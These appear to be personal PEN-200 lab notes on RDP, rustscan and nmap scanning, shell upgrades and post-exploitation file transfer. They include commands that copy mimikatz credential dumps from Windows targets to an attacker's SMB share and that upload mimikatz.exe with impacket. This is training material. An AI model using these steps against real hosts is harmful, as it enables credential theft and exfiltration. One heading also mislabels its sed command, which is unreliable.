Keep the script for future references 

1. Get new ip address
```
kali - dhclient

windows - ipconfig /renew
```

2. To kill busy listening port 
```
sudo lsof -i :<Port number> #list pid 
ps aux | grep smb

kill -9 <pid>
```

3. Remote connection 
```

xfreerdp /cert-ignore /compression /auto-reconnect /u:USERNAME /p:PASSWORD /v:IP_ADDRESS

sudo rdesktop -u USERNAME -p PASSWORD -g 90% -r disk:local="/home/kali/Desktop/" IP-ADDRESS

rdesktop -u USERNAME -p PASSWORD -a 16 -P -z -b -g 1280x860 IP_ADDRESS

 xfreerdp /u:USERNAME /p:PASSWORD /cert:ignore /v:IP_ADDRESS /w:2600 /h:1400

xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:IP_ADDRESS /u:USERNAME /p:PASSWORD /size:1180x708

rdesktop -z -P -x m -u USERNAME -p PASSWORD
```

4. Delete full directory. 
```
rm -r .wine/
```

5. Dependencies packages error solution
```
https://linuxsimply.com/linux-basics/package-management/dependencies/the-following-packages-have-unmet-dependencies/
```

6. File transfer cheatsheet
```
https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
```

7. Hacktricks if running out of ideas. 
```
https://book.hacktricks.xyz/
```

8. Rustscan instead of nmap
```
1. Scan open ports. 
rustscan -a 192.168.187.122 --ulimit 5000

2. Nano and paste open ports - open-ports.txt

3. List down open ports in one line with comma. 
cat open-ports.txt | cut -f1 -d '/' | tr '\n' ','

4. Or straight can scan with nmap
nmap -p$(cat open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A $ip 

5. Decrease mtu rate if needed 
ifconfig tun0 mtu 1250

```

9. Allocating IP. 
```
export ip=10.10.10.10
echo $ip
```

10. Alternative for gobuster 
```
feroxbuster -u http://$ip/
```

11. Upgrade shells to full tty
```
https://0xffsec.com/handbook/shells/full-tty/

SHELL=/bin/bash script -q /dev/null

python -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo; fg

For windows:
set PATH=%SystemRoot%\system32;%SystemRoot%;
```

12. Machine not working
```
Can you try to do the following to resolve your issue

disconnect from your VPN and run the command "sudo killall -w openvpn"
logout from your Portal and clear your browsers data and cache
please also run the commands below

sudo bash -c " echo nameserver 8.8.8.8 > /etc/resolv.conf"
sudo bash -c " echo nameserver 8.8.4.4 >> /etc/resolv.conf"
sudo chattr +i /etc/resolv.conf

download a new VPN pack (make sure that you are on your Course Page and not on the Main Page) and make sure to delete all the old VPN's

Once done, please try to reconnect to your VPN and see how it goes.
```


1) SMB: On Kali:

`impacket-smbserver test . -smb2support  -username kourosh -password kourosh`

On Windows:

`net use m: \\Kali_IP\test /user:kourosh kourosh copy mimikatz.log m:\`

2) RDP mounting shared folder:

- Using xfreerdp:

On Kali:

`xfreerdp /cert-ignore /compression /auto-reconnect /u: offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen- 200`

On windows:

`copy mimikatz.log \\tsclient\test\mimikatz.log`


- Using rdesktop:

On Kali:

`rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200`

On Windows:

`copy mimikatz.log \\tsclient\test\mimikatz.log`

3) Impacket tools: psexec and wmiexec are shipped with built in feature for file transfer. **Note**: By default whether you upload (lput) or download (lget) a file, it'll be writte in `C:\Windows` path. Uploading mimikatz.exe to the target machine:

`C:\Windows\system32> lput mimikatz.exe [*] Uploading mimikatz.exe to ADMIN$\/ C:\Windows\system32> cd C:\windows C:\Windows> dir /b mimikatz.exe mimikatz.exe`

Downloading mimikatz.log:

`C:\Windows> lget mimikatz.log [*] Downloading ADMIN$\mimikatz.log`


### Remove empty lines form a file using cut. 
```bash
sed -z '$ s/\n$//'
```
